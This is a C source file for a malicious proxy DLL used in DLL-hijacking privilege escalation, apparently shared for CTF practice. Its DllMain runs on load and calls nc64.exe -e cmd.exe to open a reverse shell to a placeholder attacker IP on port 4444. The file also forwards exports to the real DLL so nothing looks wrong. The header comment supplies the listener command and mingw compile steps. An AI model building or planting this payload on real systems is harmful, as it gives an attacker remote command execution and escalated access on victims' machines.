/**********************************************************
/ Defines a "new" DLL entry point that executes a random
/ payload at load (this one opens up a reverse shell back to
/ <ATTACKER-IP> you can listen in on with, e.g., nc -lnvp 4444
/ on your attack box) while forwarding all exports to the "real" DLL.
/
/ Use get_exports.py to generate an exports (.def) file for linking.
/
/ You can cross-compile this using Linux with mingw32-gcc:
/   x86_64-w64-mingw32-gcc -m64 -c -Os proxy.c -Wall -shared -masm=intel
/   x86_64-w64-mingw32-gcc -shared -m64 -def proxy.def proxy.o -o proxy.dll
/
/ Useful in PrivEsc - CTF Scenarios.
/**********************************************************/
#include <windows.h>

// Define a custom DLL entry point...
BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
            // ... and enter a Payload to execute on DLL load (DLL_PROCESS_ATTACH)
            system("C:\\tools\\nc64.exe -e cmd.exe <ATTACKER-IP> 4444");
    } // end if DLL_PROCESS_ATTACH

    return TRUE;
} // end DllMain function